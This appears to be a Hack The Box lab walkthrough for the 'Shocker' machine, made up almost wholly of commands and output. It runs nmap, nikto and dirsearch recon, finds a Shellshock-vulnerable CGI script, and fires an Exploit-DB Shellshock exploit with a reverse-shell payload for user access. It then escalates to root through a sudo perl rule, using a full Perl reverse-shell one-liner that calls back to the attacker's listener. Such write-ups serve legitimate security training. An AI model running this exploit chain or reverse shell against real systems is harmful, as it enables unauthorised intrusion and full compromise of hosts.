@@ -1,0 +1,199 @@
+RECON
+root@kali:~/htb/shocker# nmap -sC -sV -p- -vv -oA full 10.10.10.56
+PORT     STATE SERVICE REASON         VERSION
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+VULN SCAN
+root@kali:~/htb/shocker# nmap -Pn --script vuln 10.10.10.56
+80/tcp   open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+2222/tcp open  EtherNetIP-1
+
+ENUM WEB
+root@kali:~/htb/shocker# nikto -h 10.10.10.56
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.56
++ Target Hostname:    10.10.10.56
++ Target Port:        80
++ Start Time:         2020-11-15 21:19:13 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x89 0x559ccac257884 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8310 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2020-11-15 21:22:28 (GMT-5) (195 seconds)
+
+ENUM WEB
+root@kali:~/htb/shocker# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg,sh,py,pl" -f -t 50 -u http://10.10.10.56
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640
+
+Error Log: /root/dirsearch/logs/errors-20-11-15_21-33-12.log
+ 
+Output File: /root/dirsearch/reports/10.10.10.56/_20-11-15_21-33-12.txt
+
+[21:33:13] Starting: 
+[21:33:13] 200 -  137B  - //index.html
+[21:33:13] 403 -  294B  - //cgi-bin/
+[21:33:14] 403 -  292B  - //icons/
+[21:34:04] 200 -   36KB - //bug.jpg
+[21:54:41] 403 -  299B  - //server-status
+[21:54:41] 403 -  300B  - //server-status/
+
+ENUMERATE FURTHER CGI-BIN
+gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x .sh,.txt,.php
+OR
+root@kali:~/htb/shocker# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e "js,html,txt,php,jpg,sh,py,pl" -f -t 50 -u http://10.10.10.56
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: js, html, txt, php, jpg | HTTP method: GET | Threads: 50 | Wordlist size: 1543640
+
+Error Log: /root/dirsearch/logs/errors-20-11-15_21-55-12.log
+ 
+Output File: /root/dirsearch/reports/10.10.10.56/_20-11-15_21-55-12.txt
+/.hta (Status: 403)
+/.hta.sh (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.sh (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.sh (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/user.sh (Status: 200)
+
+INDICATES SHELLSHOCK VULNERABILITY
+root@kali:~/htb/shocker# searchsploit shellshock
+------------------------------------------------------ ----------------------------------------
+ Exploit Title                                        |  Path
+                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------ ----------------------------------------
+Advantech Switch - 'Shellshock' Bash Environment Vari | exploits/cgi/remote/38849.rb
+Apache mod_cgi - 'Shellshock' Remote Command Injectio | exploits/linux/remote/34900.py
+Bash - 'Shellshock' Environment Variables Command Inj | exploits/linux/remote/34766.php
+Bash CGI - 'Shellshock' Remote Command Injection (Met | exploits/cgi/webapps/34895.rb
+Cisco UCS Manager 2.1(1b) - Remote Command Injection  | exploits/hardware/remote/39568.py
+GNU Bash - 'Shellshock' Environment Variable Command  | exploits/linux/remote/34765.txt
+IPFire - 'Shellshock' Bash Environment Variable Comma | exploits/cgi/remote/39918.rb
+NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shel | exploits/cgi/webapps/40213.txt
+OpenVPN 2.2.29 - 'Shellshock' Remote Command Injectio | exploits/linux/remote/34879.txt
+PHP < 5.6.2 - 'Shellshock' 'disable_functions()' Bypa | exploits/php/webapps/35146.txt
+Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Com | exploits/linux/remote/34896.py
+RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' C | exploits/linux/local/40938.py
+Sun Secure Global Desktop and Oracle Global Desktop 4 | exploits/cgi/webapps/39887.txt
+TrendMicro InterScan Web Security Virtual Appliance - | exploits/hardware/remote/40619.py
+dhclient 4.1 - Bash Environment Variable Command Inje | exploits/linux/remote/36933.py
+------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+root@kali:~/htb/shocker# searchsploit -m 34900
+  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
+      URL: https://www.exploit-db.com/exploits/34900/
+     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
+File Type: a /usr/bin/env python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/htb/shocker/34900.py
+
+GET USER SHELL
+root@kali:~/htb/shocker# python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.8 lport=53 pages=/cgi-bin/user.sh
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/user.sh
+[!] Successfully exploited
+[!] Incoming connection from 10.10.10.56
+10.10.10.56> id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+10.10.10.56> pwd
+/usr/lib/cgi-bin
+
+10.10.10.56> cd /home/shelly
+10.10.10.56> pwd
+/home/shelly
+
+GET USER FLAG
+
+10.10.10.56> ls
+user.txt
+
+10.10.10.56> cat user.txt
+#################################
+
+10.10.10.56> sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+10.10.10.56> sudo -s
+sudo
+10.10.10.56> id
+: no tty present and no askpass program specified
+
+10.10.10.56> ls -l
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+10.10.10.56> 
+total 4
+-r--r--r-- 1 root root 33 Sep 22  2017 user.txt
+
+10.10.10.56> 
+
+10.10.10.56> 10.10.10.56> 
+10.10.10.56> sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+10.10.10.56> sudo perl -e 'use Socket;$i="10.10.14.8";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+10.10.10.56> 
+
+GET ROOT SHELL
+
+root@kali:~/htb/shocker# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.56: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.56] 50928
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+/home/shelly
+
+GET ROOT.TXT
+# cd /root
+# ls
+root.txt
+# cat root.txt
+#################################
